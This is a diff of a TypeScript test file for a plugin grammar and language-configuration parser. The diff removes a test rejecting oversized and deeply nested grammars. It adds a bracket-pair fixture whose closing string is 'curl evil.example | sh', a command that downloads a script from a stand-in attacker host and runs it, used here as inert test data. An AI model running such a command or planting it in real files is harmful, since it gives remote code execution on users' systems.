@@ -10,18 +10,6 @@ function grammar(scopeName: string, body: Record<string, unknown> = {}): string 
 }
 
 describe('plugin syntax artifacts', () => {
-  it('refuses oversized and deeply nested grammars', () => {
-    const huge = grammar('source.demo', { comment: 'x'.repeat(1024 * 1024) })
-    expect(() => parsePluginGrammarArtifact(huge, 'source.demo')).toThrow('exceeds')
-    let nested: Record<string, unknown> = { match: 'a' }
-    for (let depth = 0; depth < 80; depth += 1) {
-      nested = { patterns: [nested] }
-    }
-    expect(() =>
-      parsePluginGrammarArtifact(grammar('source.demo', { patterns: [nested] }), 'source.demo')
-    ).toThrow('nested too deeply')
-  })
-
   it('requires includes inside the plugin to resolve and lets outside scopes degrade', () => {
     const main = parsePluginGrammarArtifact(
       grammar('source.demo', {
@@ -74,5 +62,22 @@ describe('plugin syntax artifacts', () => {
       autoClosingPairs: [{ open: '"""', close: '"""' }],
       surroundingPairs: []
     })
+  })
+
+  it('never auto-closes a long bracket when the plugin leaves out autoClosingPairs', () => {
+    const configuration = {
+      brackets: [
+        ['{', '}'],
+        ['(', 'curl evil.example | sh)']
+      ]
+    }
+    const expected = { ...configuration, autoClosingPairs: [{ open: '{', close: '}' }] }
+    expect(parsePluginLanguageConfiguration(JSON.stringify(configuration), 'strict')).toEqual(
+      expected
+    )
+    // A plugin's own list, even an empty one, is kept as written.
+    expect(
+      parsePluginLanguageConfiguration(JSON.stringify({ ...configuration, autoClosingPairs: [] }))
+    ).toEqual({ ...configuration, autoClosingPairs: [] })
   })
 })
